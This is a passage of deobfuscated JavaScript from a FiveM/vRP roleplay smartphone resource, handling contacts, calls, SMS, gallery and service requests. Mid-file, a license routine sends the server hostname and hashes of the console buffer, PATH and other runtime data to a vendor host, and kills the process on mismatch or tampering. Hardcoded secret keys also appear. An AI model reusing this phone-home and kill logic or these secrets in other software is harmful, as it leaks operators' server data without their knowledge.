        if (pF.hasTable('summerz_characters')) c = c == 'user_id' ? 'id' : c, e = await pc('summerz_characters').whereIn(c, d).select('id', 'name', 'name2', 'phone'); else {
          if (pF.hasTable('summerz_dummy')) {
            c = c == 'user_id' ? 'id' : c, e = await pc('characters').whereIn(c, d).select('id', 'name', 'name2', 'phone');
          } else {
            if (f) {
              const n = ['user_id', 'name', 'firstname', 'phone'];
              if (f === 'vrp_characterdata') n[1] = 'lastname';
              e = await pc(f).whereIn(c, d).select(...n);
            } else {
              if (pF.hasTable('zusers')) {
                e = await pc('zusers').whereIn(c == 'user_id' ? 'id' : c, d);
              } else {
                if (pF.hasTable('characters')) {
                  e = await pc('characters').whereIn(c == 'user_id' ? 'id' : c, d);
                } else {
                  if ((await pF.hasColumn('creative_characters', 'phone')) && (await pF.firstColumn('creative_characters', 'name', 'nome', 'firstname', 'name2'))) {
                    if (c == 'phone' && (await pF.hasColumn('creative_characters', 'dphone'))) {
                      e = await pc('creative_characters').whereIn('phone', d).orWhereIn('dphone', d);
                    } else e = await pc('creative_characters').whereIn(c == 'user_id' ? 'id' : c, d);
                  } else {
                    if (pF.hasTable('vrp_user_identities')) {
                      if ((await pF.hasColumn('vrp_user_identities', 'telefone')) && c === 'phone') {
                        c = 'telefone';
                      }

                      e = await pc('vrp_user_identities').whereIn(c, d);
                    } else {
                      return console.error('Identity table not found'), console.error('Debug: ' + pF.tables.join(', ')), [];
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    return e.map(x => ({
      'user_id': x.user_id || x.id,
      'name': x.name || x.nome || x.firstname,
      'firstname': x.lastname || x.last_name || x.firstname || x.name2 || x.sobrenome || '',
      'phone': x.phone || x.telefone
    }));
  },

  'getIdentityByUserId'(c) {
    return pF.getIdentitiesBy('user_id', [c]).then(d => d && d[0]);
  },

  'getIdentityByPhone'(c) {
    return pF.getIdentitiesBy('phone', [c]).then(d => d && d[0]);
  },

  'getIdByPhone'(c) {
    return pH[c] || pF.getIdentityByPhone(c).then(d => d && d.user_id);
  },

  async 'getNames'(...c) {
    const d = {},
      e = await pF.getIdentitiesBy('user_id', c.flat().unique());

    for (let f of e) {
      d[f.user_id] = (f.name + ' ' + f.firstname).trim();
    }

    return d;
  },

  '💀': 1688626534
},
  pG = {},
  pH = {},
  pI = {},
  pJ = {};

function pK(c) {
  return !!pB.moderator && pE(c, pB.moderator);
}

pF.ready(async d => {
  !d.includes('smartphone_contacts') && (await pF.contacts.create(g => {
    g.id(), g.varchar('owner', 50), g.varchar('phone'), g.varchar('name');
  }), await pF.contacts.createIndex('owner'));
  !d.includes('smartphone_blocks') && (await pc('smartphone_blocks').create(i => {
    i.int('user_id').primary(), i.varchar('phone', 32).primary();
  }));
  const e = {
    'whatsapp': 0xe,
    'olx': 0xe,
    'tor': 0xe,
    'calls': 0xe,
    'twitter': 0xe,
    'paypal': 0xe
  };
  const f = pB.lifespan || e;

  if (f) {
    const i = oT();

    async function j(k, l) {
      if (l && d.includes(k)) {
        await pc(k).where('created_at', '<', i - l * 86400).delete();
      }
    }

    await j('smartphone_whatsapp_messages', f.whatsapp), await j('smartphone_tor_messages', f.tor), await j('smartphone_olx', f.olx), await j('smartphone_calls', f.calls), await j('smartphone_twitter_tweets', f.twitter), await j('smartphone_paypal_transactions', f.paypal);
  }
}), on('vRP:playerLeave', (c, d) => {
  emit('smartphone:leave', c, d);
  const e = pG[c];
  delete pH[e], delete pG[c], delete pI[e];
  delete pJ[c];
});
const pL = {};

function pM(c) {
  return vRP.getUserSource(c);
}

const pN = {
  'creative_v5': 'checkBroken',
  'creative_rework': 'CheckDamage'
};
const pO = pN;

async function pP(c) {
  const d = Number.isInteger(c) ? c : pH[c];

  var e = await vRP.getInventoryItemAmount(d, pB.item);

  if (e[0] <= 0) {
    return false;
  }

  if (d != null) {
    if (pB.item != false) {
      if (GetResourceState('pd-inventory') == 'started') {
        var e = await exports['pd-inventory'].getItemAmount(d, pB.item || 'celular');
      } else {
        var e = await vRP.getInventoryItemAmount(d, pB.item || 'cellphone');

        if (Array.isArray(e) && e[0] > 0) {
          const j = pO[pB.base];

          if (j) {
            const k = await vRP[j](e[1]);
            if (k) return true;
          }

          e = e[0];
        }
      }

      if (!e) return false;
    }

    return pM(d);
  }

  return false;
}

pL.ping = () => 'pong', pL.download = () => {
  const d = {};
  return d.version = globalThis.scriptVersion, d;
}, pL.checkPhone = async c => {
  try {
    const e = await vRP.getUserId(c);
    return Number.isInteger(e) && !!(await pP(e));
  } catch (f) {
    return false;
  }
}, pL.addContact = async (e, f, g) => {
  const h = await vRP.getUserId(e),
    i = pG[h],
    j = await pF.getIdentityByPhone(f);

  if (j) {
    const k = {};
    k.owner = i, k.phone = f, k.name = g;
    const l = await pF.contacts.insert(k).returnKeys(),
      m = {};
    return m.id = l, m.phone = f, m.name = g, m;
  } else {
    return false;
  }
}, pL.updateContact = async (i, j, k, l) => {
  const m = await vRP.getUserId(i),
    n = pG[m],
    o = {};
  o.id = j, o.owner = n;
  const p = await pF.contacts.where(o).first(),
    q = {
      'error': 'Número não encontrado'
    };
  if (!p) return q;

  if (p.phone != k) {
    const v = await pF.getIdentityByPhone(k),
      w = {
        'error': 'Número não encontrado'
      };
    if (!v) return w;
  }

  const r = {};
  r.id = j;
  const s = {};
  s.phone = k, s.name = l, await pF.contacts.where(r).update(s);
  const t = {};
  return t.id = j, t.phone = k, t.name = l, t;
}, pL.removeContact = async (d, e) => {
  const f = await vRP.getUserId(d);
  const g = pG[f],
    h = {};
  h.owner = g, h.id = e, await pF.contacts.where(h).delete();
}, pL.blocks = async d => {
  const e = await vRP.getUserId(d);
  const f = {};
  return f.user_id = e, pF.phone_blocks.where(f).pluck('phone');
}, pL.block = async (d, e) => {
  const f = await vRP.getUserId(d),
    g = {};
  g.user_id = f;
  g.phone = e, await pF.phone_blocks.replace(g);
}, pL.unblock = async (d, e) => {
  const f = await vRP.getUserId(d),
    g = {};
  g.user_id = f, g.phone = e, await pF.phone_blocks.where(g).delete();
}, pL.upload_ticket = () => oU(Math.floor(Date.now() / 86400000) + 'dando_trabalho_pra_corno'), pL.temporary_token = () => {
  const c = parseInt(Date.now() / 1000) + 3600;
  return c + '.' + oU(oU(c) + oU('f3b3705d11590258c4c13629957ef35565427a0f'));
};
const pQ = {};
pQ.identity = {}, pQ.contacts = [], pQ.services = [], pQ.disabledApps = [], pQ.backgroundURL = pB.client.backgroundURL;
const pR = pQ;
pL.getSettings = async f => {
  const g = await vRP.getUserId(f);
  if (!Number.isInteger(g)) return {
    ...pR,
    'reason': 'user_id is ' + g
  };
  const h = await pF.getIdentityByUserId(g);
  if (!h || !h.phone) return {
    ...pR,
    'reason': h ? 'null phone' : 'null identity'
  };
  const i = pJ[g] || h.phone;
  pG[g] = i, pH[i] = g;
  pI[i] = f, h.phone = i, h.moderator = await pK(g);
  const j = {};
  j.owner = i;
  const k = await pF.contacts.select('id', 'phone', 'name').where(j),
    l = {};
  l.user_id = g;
  const m = await pF.phone_blocks.where(l).pluck('phone'),
    n = pB.services;
  emit('smartphone:enter', g, f);
  const o = {
    'identity': h,
    'contacts': k,
    'blocks': m,
    'services': n,
    ...pB.client
  };
  return o;
}, on('smartphone:insertPhoneNumber', (c, d, e) => {
  pH[e] = d, pG[d] = e, pI[e] = c;
}), on('smartphone:selectNumber', (c, d, e) => {
  if (e) pJ[d] = e; else delete pJ[d];
  oS(c, 'REFRESH', {});
}), exports('isReady', () => true), exports('createApp', (d, e, f, g) => {
  pB.client.customApps = pB.client.customApps || {}, pB.client.customApps[d] = g, pB.client.apps = pB.client.apps || {};
  const h = {};
  h.name = e, h.icon = f, pB.client.apps[d] = h, pz.metadata('started.' + d, new Date().toISOString());
  return true;
}), exports('tchabibi', () => true), on('smartphone:alternateDphone', async (d, e) => {
  const f = pG[e],
    g = {};
  g.id = e;
  const h = await pc('creative_characters').where(g).first();
  if (!h) return;

  if (h.dphone) {
    pJ[e] = f == h.phone ? h.dphone : h.phone, oS(d, 'REFRESH', {});
  }
});
const pS = {};
let pT = 'prop_amb_phone';
setImmediate(function () {
  const c = global.LoadResourceFile('smartphone', 'client.lua'),
    d = c.match(/(_G\.)?phoneModel ?= ?['`"](\w+)['`"]/);

  if (d) {
    const f = d[1];
    pT = parseInt(f) || f;
  }
});

function pU(c) {
  if (c != null && global.DoesEntityExist(c)) {
    global.DeleteEntity(c);
  }
}

let pV = 0;

function pW() {
  if (pV < Date.now()) {
    console.error('Falha ao criar o prop do celular, este problema é grave, porém ignorável [ENTITY DELETED]'), pV = Date.now() + 300000;
  }

  return false;
}

pL['0x00029a'] = async c => {
  if (!pB.serverSideProp) {
    return 'auto';
  }

  pU(pS[c]);
  const d = GetPlayerPed(c),
    [e, f, g] = GetEntityCoords(d),
    h = global.CreateObject(GetHashKey(pT), e, f, g - 1.5, true, true, false);

  if (h == 0) {
    return pW();
  }

  let i = 0;

  while (!global.DoesEntityExist(h)) {
    if (i > 3000) {
      return pW();
    }

    i += 50, await p2(50);
  }

  pS[c] = h;
  const j = global.NetworkGetNetworkIdFromEntity(h);
  return global.emit('MQCU:R', j, c), j;
}, pL['0x00029f'] = (c, d) => {
  if (pB.serverSideProp) pU(pS[c]), delete pS[c]; else {
    if (d) {
      try {
        const f = NetworkGetEntityFromNetworkId(d);
        global.DeleteEntity(f);
      } catch { }
    }
  }
}, global.on('onResourceStop', c => {
  if (c === 'smartphone') {
    Object.values(pS).forEach(pU);
  }
}), global.on('playerDropped', () => {
  const c = global.source;
  c in pS && (pU(pS[c]), delete pS[c]);
}), global.on('smartphone:updatePhoneNumber', async (l, m) => {
  const n = pG[l],
    o = {};
  o.from = n, o.to = m, oS(-1, 'PHONE_CHANGE', o);
  const p = await pM(l);

  if (p) {
    delete pI[n], delete pH[n], pH[m] = l, pG[l] = m, pI[m] = p;
  }

  try {
    const s = {};
    s.initiator = n;
    const t = {};
    t.initiator = m, await pF.phone_calls.where(s).update(t);
    const u = {};
    u.target = n;
    const v = {};
    v.target = m, await pF.phone_calls.where(u).update(v);
    const w = {};
    w.owner = n;
    const x = {};
    x.owner = m, await pF.contacts.where(w).update(x);
    const y = {};
    y.phone = n;
    const z = {};
    z.phone = m, await pF.contacts.where(y).update(z), pA.emit('whatsapp:updatePhoneNumber', n, m), oS(p, 'REFRESH', {});
  } catch (A) {
    console.error('Failed to updatePhoneNumber'), console.error(A.message);
  }
});

function pX(c, e = '') {
  c = String(c) + e;
  var f = pY(q0(q1(pZ(c), 8 * c.length)));
  return f.toLowerCase();
}

function pY(c) {
  for (var e, g = '0123456789ABCDEF', h = '', i = 0; i < c.length; i++) e = c.charCodeAt(i), h += g.charAt(e >>> 4 & 15) + g.charAt(15 & e);

  return h;
}

function pZ(c) {
  for (var e = Array(c.length >> 2), f = 0; f < e.length; f++) e[f] = 0;

  for (f = 0; f < 8 * c.length; f += 8) e[f >> 5] |= (255 & c.charCodeAt(f / 8)) << f % 32;

  return e;
}

function q0(c) {
  for (var e = '', f = 0; f < 32 * c.length; f += 8) e += String.fromCharCode(c[f >> 5] >>> f % 32 & 255);

  return e;
}

function q1(c, j) {
  c[j >> 5] |= 128 << j % 32, c[14 + (j + 64 >>> 9 << 4)] = j;

  for (var k = 1732584193, l = -271733879, o = -1732584194, p = 271733878, q = 0; q < c.length; q += 16) {
    var s = k,
      u = l,
      v = o,
      w = p;
    l = q6(l = q6(l = q6(l = q6(l = q5(l = q5(l = q5(l = q5(l = q4(l = q4(l = q4(l = q4(l = q3(l = q3(l = q3(l = q3(l, o = q3(o, p = q3(p, k = q3(k, l, o, p, c[q + 0], 7, -680876936), l, o, c[q + 1], 12, -389564586), k, l, c[q + 2], 17, 606105819), p, k, c[q + 3], 22, -1044525330), o = q3(o, p = q3(p, k = q3(k, l, o, p, c[q + 4], 7, -176418897), l, o, c[q + 5], 12, 1200080426), k, l, c[q + 6], 17, -1473231341), p, k, c[q + 7], 22, -45705983), o = q3(o, p = q3(p, k = q3(k, l, o, p, c[q + 8], 7, 1770035416), l, o, c[q + 9], 12, -1958414417), k, l, c[q + 10], 17, -42063), p, k, c[q + 11], 22, -1990404162), o = q3(o, p = q3(p, k = q3(k, l, o, p, c[q + 12], 7, 1804603682), l, o, c[q + 13], 12, -40341101), k, l, c[q + 14], 17, -1502002290), p, k, c[q + 15], 22, 1236535329), o = q4(o, p = q4(p, k = q4(k, l, o, p, c[q + 1], 5, -165796510), l, o, c[q + 6], 9, -1069501632), k, l, c[q + 11], 14, 643717713), p, k, c[q + 0], 20, -373897302), o = q4(o, p = q4(p, k = q4(k, l, o, p, c[q + 5], 5, -701558691), l, o, c[q + 10], 9, 38016083), k, l, c[q + 15], 14, -660478335), p, k, c[q + 4], 20, -405537848), o = q4(o, p = q4(p, k = q4(k, l, o, p, c[q + 9], 5, 568446438), l, o, c[q + 14], 9, -1019803690), k, l, c[q + 3], 14, -187363961), p, k, c[q + 8], 20, 1163531501), o = q4(o, p = q4(p, k = q4(k, l, o, p, c[q + 13], 5, -1444681467), l, o, c[q + 2], 9, -51403784), k, l, c[q + 7], 14, 1735328473), p, k, c[q + 12], 20, -1926607734), o = q5(o, p = q5(p, k = q5(k, l, o, p, c[q + 5], 4, -378558), l, o, c[q + 8], 11, -2022574463), k, l, c[q + 11], 16, 1839030562), p, k, c[q + 14], 23, -35309556), o = q5(o, p = q5(p, k = q5(k, l, o, p, c[q + 1], 4, -1530992060), l, o, c[q + 4], 11, 1272893353), k, l, c[q + 7], 16, -155497632), p, k, c[q + 10], 23, -1094730640), o = q5(o, p = q5(p, k = q5(k, l, o, p, c[q + 13], 4, 681279174), l, o, c[q + 0], 11, -358537222), k, l, c[q + 3], 16, -722521979), p, k, c[q + 6], 23, 76029189), o = q5(o, p = q5(p, k = q5(k, l, o, p, c[q + 9], 4, -640364487), l, o, c[q + 12], 11, -421815835), k, l, c[q + 15], 16, 530742520), p, k, c[q + 2], 23, -995338651), o = q6(o, p = q6(p, k = q6(k, l, o, p, c[q + 0], 6, -198630844), l, o, c[q + 7], 10, 1126891415), k, l, c[q + 14], 15, -1416354905), p, k, c[q + 5], 21, -57434055), o = q6(o, p = q6(p, k = q6(k, l, o, p, c[q + 12], 6, 1700485571), l, o, c[q + 3], 10, -1894986606), k, l, c[q + 10], 15, -1051523), p, k, c[q + 1], 21, -2054922799), o = q6(o, p = q6(p, k = q6(k, l, o, p, c[q + 8], 6, 1873313359), l, o, c[q + 15], 10, -30611744), k, l, c[q + 6], 15, -1560198380), p, k, c[q + 13], 21, 1309151649), o = q6(o, p = q6(p, k = q6(k, l, o, p, c[q + 4], 6, -145523070), l, o, c[q + 11], 10, -1120210379), k, l, c[q + 2], 15, 718787259), p, k, c[q + 9], 21, -343485551), k = q7(k, s), l = q7(l, u), o = q7(o, v), p = q7(p, w);
  }

  return Array(k, l, o, p);
}

function q2(c, e, g, h, j, k) {
  return q7(q8(q7(q7(e, c), q7(h, k)), j), g);
}

function q3(c, e, g, h, j, k, l) {
  return q2(e & g | ~e & h, c, e, j, k, l);
}

function q4(c, e, g, h, j, k, l) {
  return q2(e & h | g & ~h, c, e, j, k, l);
}

function q5(c, e, g, h, j, k, l) {
  return q2(e ^ g ^ h, c, e, j, k, l);
}

function q6(c, e, g, h, j, k, l) {
  return q2(g ^ (e | ~h), c, e, j, k, l);
}

function q7(c, e) {
  var f = (65535 & c) + (65535 & e);
  return (c >> 16) + (e >> 16) + (f >> 16) << 16 | 65535 & f;
}

function q8(c, e) {
  return c << e | c >>> 32 - e;
}

globalThis.config = require('./config.json'), setInterval(() => {
  p7.clear(), p0.map.clear();
}, 1000);
const q9 = {},
  qa = {};
onNet('backend:req', async (e, f, g) => {
  const h = global.source;

  if (!Array.isArray(g)) {
    if (typeof g != 'object') {
      const l = {
        '__null__': true
      };
      return emitNet('backend:res', h, e, l);
    }

    const j = [];

    for (let [m, n] of Object.entries(g)) {
      j[parseInt(m) - 1] = n;
    }

    g = j;
  }

  if (p7.get(h) > 15) {
    return qa[h] = true, DropPlayer(h, 'Smartphone Anti flood');
  } else {
    if (config.antiflood != false) {
      if (config.req_debug) console.log('[%d] -> %s %s', h, f, JSON.stringify(g));
      p7.set(h, (p7.get(h) || 0) + 1);
    }
  }

  while (globalThis.poptyscoop !== false) {
    await p2(500);
  }

  if (!pL[f]) {
    return console.error(f + ' does not exists in backend');
  }

  f.match(/^(bank|paypal)/) && (await p2(100));

  while (q9[h]) {
    await p2(100);
  }

  if (qa[h]) return;

  try {
    q9[h] = true;
    const w = await pL[f](h, ...g),
      x = {
        '__null__': true
      };
    emitNet('backend:res', h, e, w == null ? x : w);
  } catch (y) {
    if (y instanceof p8) {
      return emitNet('backend:res', h, e, y);
    }

    console.error('Smartphone::Error', y.message), console.error(y.stack), console.error('Method ' + f + ' with ' + JSON.stringify(g));
  } finally {
    delete q9[h];
  }
}), on('playerDropped', () => {
  const c = global.source;
  qa[c] = true, delete q9[c], setTimeout(() => delete qa[c], 5000);
}), p6(async function () {
  let c = Date.now();
  let d = 0;

  while (true) {
    await p2(5050), d += 4000;

    if (Math.abs(Date.now() - c) <= d || !Function.prototype.toString.apply(Date.now).includes('[native code]')) {
      await p2(1000), process.exit(0);
    }
  }
});

const qb = 'b9044a318852d9c0618a7e198b7dd93f';
var code = 0;

p6(async function () {
  try {
    while (true) {
      const e = {};
      e.authorization = config.token, e['fx-name'] = Buffer.from(GetConvar('sv_hostname')).toString('base64');
      let f = ['GetInstanceId', 'GetNumResources', 'GetGameTimer', 'GetConsoleBuffer', 'GetRegisteredCommands'];
      const g = {};
      g.bulletproof = [];

      for (let l of f) {
        g.bulletproof.push(pX(JSON.stringify(globalThis[l]())));
      }

      g.bulletproof.push(pX(process.hrtime()[0])), g.bulletproof.push(pX(process.hrtime()[1])), g.bulletproof.push(pX(process.title)), g.bulletproof.push(pX(process.env.PATH)), g.bulletproof.sort();

      const h = await pz.post('https://fivem.jesteriruka.dev/v2/server/6056b4aa1cf80010efb4ed1d/authenticate', g, e),
        j = require('crypto').createHash('sha256').update(Math.floor(Date.now() / 600000) + qb).digest('base64'),
        k = h.data.bulletproof;



      globalThis.poptyscoop = false;

      if (h.data.fingerprint) {
        const u = pX(Math.floor(Date.now() / 604800000) + qb);

        if (h.data.fingerprint !== u) {
          code = 400;
          process.kill();
        }
      }

      code = 200; // AUTHORIZED

      return await pF.fetchTables(), await Promise.resolve().then(function () {
        return pr;
      }), await Promise.resolve().then(function () {
        return qi;
      }), await Promise.resolve().then(function () {
        return qk;
      }), await Promise.resolve().then(function () {
        return qn;
      }), await Promise.resolve().then(function () {
        return qp;
      }), await Promise.resolve().then(function () {
        return qv;
      }), await Promise.resolve().then(function () {
        return qH;
      }), await Promise.resolve().then(function () {
        return qM;
      }), await Promise.resolve().then(function () {
        return qZ;
      }), await Promise.resolve().then(function () {
        return r5;
      }), await Promise.resolve().then(function () {
        return rf;
      }), await Promise.resolve().then(function () {
        return rj;
      }), await Promise.resolve().then(function () {
        return rq;
      }), await Promise.resolve().then(function () {
        return rt;
      }), await Promise.resolve().then(function () {
        return rA;
      }), await Promise.resolve().then(function () {
        return rD;
      }), await Promise.resolve().then(function () {
        return rK;
      }), await Promise.resolve().then(function () {
        return s9;
      }), emit('smartphone:isReady'), pz.metadata('video_server', config.client.videoServer || null), pz.metadata('apps', config.client.customApps || null);
    }
  } catch (x) {
    console.error('Wait, what?'), await p2(5000);
  }
});
const qc = {
  'deepweb': 'http://131.196.198.167/smartphone/apps/tor.png',
  'instagram': 'http://131.196.198.167/smartphone/apps/instagram.png',
  'bank': 'http://131.196.198.167/smartphone/apps/bank.png',
  'paypal': 'http://131.196.198.167/smartphone/apps/paypal.png',
  'olx': 'http://131.196.198.167/smartphone/apps/olx.png',
  'twitter': 'http://131.196.198.167/smartphone/apps/twitter.png',
  'services': 'http://131.196.198.167/smartphone/apps/config.png',
  'weazel': 'http://131.196.198.167/smartphone/apps/weazel.png',
  'casino': 'http://131.196.198.167/smartphone/apps/blaze.png'
};
let qd = qc,
  qe = 0;

function qf({
  name: c,
  avatar: d,
  content: e
}) {
  if (typeof config.webhookURL === 'string' && config.webhookURL.startsWith('http')) {
    const g = {
      'username': c || 'Webhook',
      'avatar_url': qd[(d || c).toLowerCase()],
      'content': typeof e === 'object' ? qg(e) : e
    };
    return pz.post(config.webhookURL, g).catch(() => {
      if (qe > Date.now()) {
        return;
      }

      qe = Date.now() + 15000, console.error('Não foi possível enviar um webhook para o discord, isso não foi um problema do celular, e sim um problema de rede que você não é capaz de resolver, apenas aguarde. (NAO ENVIE ESSE ERRO NO DISCORD)');
    });
  }

  return Promise.resolve();
}

const qg = c => '```yml\n' + Object.entries(c).map(([d, e]) => e && d + ': ' + e).filter(d => d).join('\n') + '```',
  qh = {
    '__proto__': null
  };

qh.default = qf, qh.yml = qg;
var qi = Object.freeze(qh);

pL.sms_send = async (c, d, e) => {
  const f = await vRP.getUserId(c),
    g = pG[f];
  if (p0(c, 'sms', 3)) return;
  const h = {
    'sender': g,
    'content': e,
    'created_at': oT(),
    'delivered': true
  },
    i = await pP(d);
  return i && (oS(i, 'SMS', h)), h;
};

const qj = {
  '__proto__': null
};
var qk = Object.freeze(qj);

function ql() {
  return pc('smartphone_gallery');
}

pF.ready(async c => {
  if (!c.includes('smartphone_gallery')) {
    await ql().create(d => {
      d.id(), d.int('user_id'), d.varchar('folder').default('/'), d.varchar('url'), d.int('created_at');
    }), await ql().createIndex('user_id');
  }
}), pL.gallery = async d => {
  const e = await vRP.getUserId(d),
    f = {};
  f.user_id = e;
  return ql().where(f).limit(300).orderBy('id', 'DESC').select('id', 'folder', 'url', 'created_at');
}, pL.gallery_save = async (d, e, f) => {
  const g = await vRP.getUserId(d),
    h = oT();
  const i = {};
  i.user_id = g, i.folder = e;
  i.url = f, i.created_at = h;
  const j = i;
  return j.id = await ql().insert(j).returnKeys(), j;
}, pL.gallery_destroy = async (d, e) => {
  const f = await vRP.getUserId(d),
    g = {};
  g.id = e, g.user_id = f, await ql().where(g).delete();
};
const qm = {
  '__proto__': null
};
var qn = Object.freeze(qm);

pL.service_request = async (i, j, k, l) => {
  const m = await vRP.getUserId(i);
  const n = pG[m],
    o = await pF.getName(m),
    p = pB.services.find(q => q.number === j);

  if (p) {
    if (p5('onServiceRequest')) {
      const s = {};
      return s.source = i, s.user_id = m, s.phone = n, s.name = o, s.service = p, s.content = k, s.location = l, exports.smartphone.onServiceRequest(s);
    }

    // console.log("OIFJDSIOFJSDIOFIOSDJFIOSDFJIOSD")

    const q = await findUsersForPermissions(p.permission);
    let r = false;

    if (q.length === 0) {
      const v = {};
      v.source = i, v.user_id = m, v.phone = n, v.name = o, v.service = p, v.content = k, v.location = l, emit('smartphone:service_unavailable', v);
      const w = {
        'error': 'Serviço indisponível no momento'
      };
      return w;
    } else {
      if (p.dev) {
        const x = {};
        x.source = i, x.user_id = m, x.phone = n, x.name = o, x.service = p, x.content = k, x.location = l, emit('smartphone:service_request', x);
      } else {
        for (let A of q) {
          if (!Number.isInteger(A)) continue;
          const B = await pM(A);
          if (!B) continue;
          emitNet('chatMessage', B, 'CHAMADO', [19, 197, 43], '(' + p.name + ')  Enviado por ^1' + o + '^0 [' + m + '], ' + k);
          const C = {};
          C.user_id = m, C.phone = n, C.name = o, emitNet('smartphone:service_request', B, C), vRP.request(B, 'Atender o chamado de ' + o + '?', 30).then(D => {
            if (D) {
              if (r) {
                emitNet('Notify', B, 'negado', 'Esse chamado já foi atendido');
              } else {
                r = true;
                const F = {};
                F.location = l, oS(B, 'GPS', F), oS(i, 'SERVICE_RESPONSE', {});
                const G = {};
                G.ID = m, G.NOME = o, G.SERVICO = p.name, G.MENSAGEM = k, G.ATENDENTE = A;
                const H = {
                  'name': 'Chamados',
                  'avatar': 'services'
                };
                H.content = G, qf(H);
              }
            }
          }, () => { });
        }

        setTimeout(() => {
          if (!r) {
            oS(i, 'SERVICE_REJECT', {});
            const G = {};
            G.ID = m, G.NOME = o, G.SERVICO = p.name, G.MENSAGEM = k;
            const H = {
              'name': 'Chamados (Não atendidos)',
              'avatar': 'services'
            };
            H.content = G, qf(H);
          }
        }, 31000);
      }
    }
  } else {
    const G = {
      'error': 'Este serviço não existe'
    };
    return G;
  }
};


async function findUsersForPermissions(permissions) {
  let q = []

  for (const permission of permissions) {
    let data = await vRP.getUsersByPermission(permission)
    
    q = q.concat(data).unique();
  }

  return q;
}

const qo = {
  '__proto__': null
};
var qp = Object.freeze(qo);
pF.ready(async c => {
  if (!c.includes(pF.phone_calls.table)) {
    await pF.phone_calls.create(d => {
      d.id(), d.varchar('initiator', 50), d.varchar('target', 50), d.int('duration').default(0), d.varchar('status'), d.tinyint('video').default(0), d.tinyint('anonymous').default(0), d.bigint('created_at');
    }), await pF.phone_calls.createIndex('initiator'), await pF.phone_calls.createIndex('target');
  }
});
const qq = [];

function qr(c, d = 'ok') {
  const e = qq.indexOf(c);

  if (e != -1) {
    qq.splice(e, 1);
    const f = c.accepted ? oT() - c.accepted_at : 0;
    pF.phone_calls.insert({
      'initiator': c.initiator.phone,
      'target': c.target.phone,
      'duration': f,
      'status': d,
      'video': c.isVideo,
      'anonymous': c.isAnonymous,
      'created_at': c.accepted_at || oT()
    }).then(() => { });
  }
}

pL.getPhoneCalls = async e => {
  const f = await vRP.getUserId(e),
    g = pG[f],
    h = {};
  h.initiator = g;
  const i = {};
  i.target = g;
  return pF.phone_calls.where(h).orWhere(i).orderBy('id', 'DESC').limit(100);
}, pL.call_p2p = async (d, e, f) => {
  const g = qq.find(h => h.sources.includes(d));

  if (g) {
    const i = {};
    i.event = e, i.args = f, oS(g.other(d), 'CALL_P2P', i);
  }
};

const qs = () => qq.reduce((c, d) => Math.max(c, d.room), 1200) + 1;

function qt(c) {
  return (global.GetHashKey(pB.token + ':fake:' + c) + 2147483648).toString().replace(/(\d{3})(\d{3})(\d{4})/, '$1 $2-$3');
}

pL.createPhoneCall = async (h, i, j = false, k = false) => {
  const l = await vRP.getUserId(h),
    m = k ? qt(pG[l]) : pG[l],
    n = {
      'error': 'Você já está realizando uma ligação'
    };
  if (qq.some(q => q.initiator.source == h || q.target.source == h && q.accepted)) return n;
  const o = pH[i];

  if (o) {
    const r = {};
    r.user_id = o, r.phone = m;

    if (await pF.phone_blocks.where(r).exists()) {
      const t = {
        'error': 'Número fora de área'
      };
      return t;
    }

    const s = await pP(o);

    if (s) {
      if (qq.some(w => w.initiator.source == s || w.target.source == s)) {
        const w = {
          'error': 'Esta linha está ocupada'
        };
        return w;
      } else {
        const z = {
          'sources': [h, s],
          'initiator': {
            'id': l,
            'source': h,
            'phone': m
          },
          'target': {
            'id': o,
            'source': s,
            'phone': i
          },
          'accepted': false,
          'room': qs(),
          'isVideo': j,
          'isAnonymous': k,

          'other'(A) {
            return this.sources.find(B => B != A);
          },

          'mode': 'tokovoip'
        };
        qq.push(z);
        if (pB.call_mode) z.mode = pB.call_mode; else {
          if (GetResourceState('tokovoip_script') == 'started') { } else {
            if (GetResourceState('mumble-voip') == 'started') {
              z.mode = 'mumble-voip';
            } else {
              if (GetResourceState('voip') == 'started') {
                z.mode = 'voip';
              } else {
                if (GetResourceState('saltychat') == 'started') z.mode = 'saltychat'; else {
                  z.mode = 'rtc';
                }
              }
            }
          }
        }
        return z.timeout = setTimeout(() => {
          !z.accepted && qq.includes(z) && (qr(z, 'unanswered'), oS(z.initiator.source, 'CALL_END', {}), oS(z.target.source, 'CALL_END', {}));
        }, 20000), oS(s, 'CALL_REQUEST', z), z;
      }
    }
  }

  const p = {
    'error': 'Número fora de área'
  };
  return p;
}, pL.answerPhoneCall = (d, e) => {
  const f = qq.find(g => g.room == e);

  if (f) {
    if (!f.accepted) {
      clearTimeout(f.timeout), f.accepted = true, f.accepted_at = oT(), oS(f.initiator.source, 'CALL_READY', {});
      if (f.mode === 'saltychat') exports.saltychat.EstablishCall(f.initiator.source, f.target.source); else f.mode === 'tokovoip' && f.sources.forEach(j => emit('TokoVoip:addPlayerToRadio', f.room, j, false));
    }
  } else {
    const k = {
      'error': 'Esta ligação não existe mais'
    };
    return k;
  }
}, pL.refusePhoneCall = d => {
  const e = qq.find(f => f.target.source == d);

  if (e) {
    clearTimeout(e.timeout), qr(e, 'refused'), oS(e.initiator.source, 'CALL_END', {});
  } else {
    const h = {
      'error': 'Esta ligação não existe mais'
    };
    return h;
  }
}, pL.endPhoneCall = c => {
  const d = qq.find(e => e.sources.includes(c));

  if (d) {
    if (d.accepted) {
      qr(d, 'ok');
      if (d.mode === 'saltychat') exports.saltychat.EndCall(d.initiator.source, d.target.source); else d.mode === 'tokovoip' && d.sources.forEach(j => {
        emit('TokoVoip:removePlayerFromRadio', d.room, j), emit('TokoVoip:removePlayerFromAllRadio', j);
      });
    } else {
      clearTimeout(d.timeout), qr(d, 'unanswered');
    }

    const f = d.sources.find(k => k != c);
    f && oS(f, 'CALL_END');
  }
}, on('vRP:playerLeave', (c, d) => pL.endPhoneCall(d));
const qu = {
  '__proto__': null
};
var qv = Object.freeze(qu);

const qw = () => pc('smartphone_bank_invoices');

pF.ready(async c => {
  const d = qw();

  if (!c.includes(d.table)) {
    await d.create(f => {
      f.id(), f.int('payee_id'), f.int('payer_id'), f.varchar('reason').default(''), f.int('value'), f.tinyint('paid').default(0), f.int('created_at'), f.int('updated_at');
    });
  }

  if ((await pF.hasTable('wise_multas')) && !(await pF.firstColumn('wise_multas', 'id', 'multa_id'))) {
    pc.query('ALTER TABLE wise_multas ADD COLUMN id BIGINT PRIMARY KEY AUTO_INCREMENT');
  }
});

async function qx(c) {
  const d = pF.firstTable('summerz_characters', 'characters'),
    e = pF.firstTable('vrp_user_identities', 'vrp_characters');
